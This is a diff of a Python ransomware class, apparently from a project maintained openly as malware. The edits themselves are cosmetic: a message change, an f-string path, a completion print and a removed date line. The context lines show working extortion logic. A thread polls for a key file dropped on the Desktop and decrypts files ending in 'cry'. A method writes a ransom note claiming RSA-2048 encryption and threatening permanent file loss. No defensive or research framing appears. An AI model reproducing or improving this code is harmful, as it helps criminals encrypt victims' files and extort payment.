@@ -74,7 +74,7 @@ class Ransomware:
         print("Decrypt thread")
         while True:
             try:
-                print('waiting for unlock file')
+                print('Waiting for unlock file')
                 with open(f'{self.sysRoot}/Desktop/PUT_ON_DESKTOP.pem', 'r') as f:
                     self.UnlockKey = f.read()
                     arr = os.walk(self.attackroot, topdown=True)
@@ -82,8 +82,9 @@ class Ransomware:
                         for file in files:
                             if file.endswith("cry"):
                                 file_path = os.path.join(root, file)
-                                dec_file_path = decrypt_file(file_path, self.sysRoot+"/Desktop/PUT_ON_DESKTOP.pem")
+                                dec_file_path = decrypt_file(file_path, f'{self.sysRoot}/Desktop/PUT_ON_DESKTOP.pem')
                                 print(dec_file_path)
+                    print("System decryption complete!")
                     break
             except Exception as e:
                 print(e)
@@ -91,7 +92,6 @@ class Ransomware:
             time.sleep(10)
 
     def ransom_note(self):
-        date = datetime.date.today().strftime('%d-%B-Y')
         with open(self.sysRoot + "/Desktop/RANSOM_NOTE.txt", 'w') as f:
             f.write(f'''
     The hard disk of your computer have been encrypted with RSA-2048 encryption.
@@ -107,7 +107,6 @@ class Ransomware:
     WARNING:
     Do NOT change file names, mess with the files, or run decryption software as there is a high chance you will lose your files forever.
     ''')
-        # subprocess.run(['open', self.sysRoot + "/Desktop/RANSOM_NOTE.txt"], check=True)
 
     def show_ransom_note(self):
         # Open the ransom note
